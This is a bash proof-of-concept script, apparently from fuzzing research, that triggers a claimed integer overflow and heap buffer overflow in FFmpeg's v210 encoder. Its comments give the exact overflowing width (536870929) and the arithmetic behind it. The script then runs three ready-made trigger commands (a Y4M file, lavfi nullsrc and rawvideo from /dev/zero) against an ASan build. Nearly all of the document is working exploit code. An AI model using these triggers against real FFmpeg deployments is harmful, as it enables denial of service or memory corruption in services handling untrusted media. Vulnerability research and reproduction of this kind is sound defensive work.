#!/bin/bash
# PoC runner for VULN 001: Integer Overflow in stride Computation
# Leading to Heap Buffer Overflow in v210 Encoder (v210enc.c lines 72-78)
#
# Root cause:
#   int aligned_width = ((avctx->width + 47) / 48) * 48;
#   int stride = aligned_width * 8 / 3;
# With width=536870929: aligned_width=536870976, 536870976*8=4294967808 overflows
# signed int (INT_MAX=2147483647) and wraps to 512, giving stride=170.
# ff_get_encode_buffer allocates 170 bytes; pack_line writes ~1.4 GB -> heap overflow.

set -euo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
POC_DIR="$(dirname "$0")"

echo "=== VULN 001 PoC: v210enc Integer Overflow ==="
echo "Binary: $BIN"
echo ""

# -------------------------------------------------------------------------
# Approach 1: Y4M sparse file
# -------------------------------------------------------------------------
echo "=== Approach 1: Y4M sparse file ==="
echo "Generating Y4M input..."
python3 "$POC_DIR/vuln_001_gen.py" || {
    echo "ERROR: gen.py failed"
}

if [ -f "$POC_DIR/vuln_001_input.y4m" ]; then
    echo "Running ffmpeg with Y4M input (width=536870929)..."
    ASAN_OPTIONS="abort_on_error=0:log_path=$POC_DIR/asan_y4m.log" \
      "$BIN" -y -i "$POC_DIR/vuln_001_input.y4m" \
      -c:v v210 -frames:v 1 -f null - 2>&1 | head -80 || true
    echo "--- ASAN log (y4m) ---"
    cat "$POC_DIR"/asan_y4m.log.* 2>/dev/null || echo "(no ASAN log)"
else
    echo "SKIPPED: Y4M file not created"
fi

echo ""
echo "=== Approach 2: lavfi nullsrc ==="
echo "Running ffmpeg with nullsrc filter (width=536870929)..."
ASAN_OPTIONS="abort_on_error=0:log_path=$POC_DIR/asan_lavfi.log" \
  "$BIN" -y \
  -f lavfi -i "nullsrc=size=536870929x1:rate=1" \
  -vframes 1 -c:v v210 -f null - 2>&1 | head -80 || true
echo "--- ASAN log (lavfi) ---"
cat "$POC_DIR"/asan_lavfi.log.* 2>/dev/null || echo "(no ASAN log)"

echo ""
echo "=== Approach 3: rawvideo pipe ==="
echo "Running ffmpeg with rawvideo demuxer (width=536870929)..."
ASAN_OPTIONS="abort_on_error=0:log_path=$POC_DIR/asan_raw.log" \
  "$BIN" -y \
  -f rawvideo -pixel_format yuv422p -video_size 536870929x1 -framerate 1 \
  -i /dev/zero \
  -vframes 1 -c:v v210 -f null - 2>&1 | head -80 || true
echo "--- ASAN log (rawvideo) ---"
cat "$POC_DIR"/asan_raw.log.* 2>/dev/null || echo "(no ASAN log)"

echo ""
echo "=== Done ==="
